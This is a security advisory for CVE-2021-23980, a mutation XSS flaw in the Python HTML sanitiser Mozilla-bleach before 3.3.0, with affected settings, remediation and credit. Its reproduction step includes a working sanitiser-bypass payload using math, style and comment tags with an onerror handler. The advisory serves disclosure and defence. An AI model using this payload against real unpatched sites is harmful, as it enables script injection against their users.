---
title: Mutation XSS in Mozilla-bleach using comments
date: 2021-02-01
tags:
	- "python"
	- "mozilla"
	- "xss"
	- "mxss"
advisory: true
origin: https://advisory.checkmarx.net/advisory/CX-2021-4303/
cves:
	- "CVE-2021-23980"
---
## Summary
Affected versions of Mozilla-bleach are vulnerable to Mutation XSS (mXSS) vulnerability when calling bleach.clean with:
* `svg` or `math` allowed 
* `p` or `br` allowed
* one of the RCDATA tags allowed:
```
script
noscript
style
noframes
xmp
noembed
iframe
```
* and the argument `strip_comments=False`


## Product
Bleach before 3.3.0.

## Impact
According to GitHub, more than 72,000 repositories are dependent on Bleach. Among them are major vendors, including multiple Fortune 500 tech companies.

## Steps to reproduce
```
>>> import bleach
>>> bleach.clean('<math></p><style><!--</style><img src/onerror=alert(1)>', tags=['math', 'p', 'style'], strip_comments=False)
```

### Expected result:
```<math><p></p><style><!--</style><img src/onerror=alert(1)>--></style></math>```

## Remediation
Update bleach dependency to 3.3.0 or above.

## Credit
This issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://www.twitter.com/ynizry).

## Resources
1. [Advisory](https://github.com/advisories/GHSA-vv2x-vrpj-qqpq)
2. Commit [79b7a3c](https://github.com/mozilla/bleach/commit/79b7a3c5e56a09d1d323a5006afa59b56162eb13)
